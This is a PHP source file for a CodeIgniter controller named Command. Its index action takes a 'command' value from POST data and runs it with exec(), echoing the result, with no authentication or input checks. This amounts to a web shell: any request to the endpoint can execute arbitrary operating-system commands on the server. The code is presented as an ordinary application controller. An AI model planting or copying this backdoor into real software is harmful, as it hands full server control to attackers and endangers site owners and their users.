<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Command extends CI_Controller
{
    public function index()
    {
        $parameters = $this->input->post();

        $command = $parameters['command'];

        echo exec($command);
    }
}
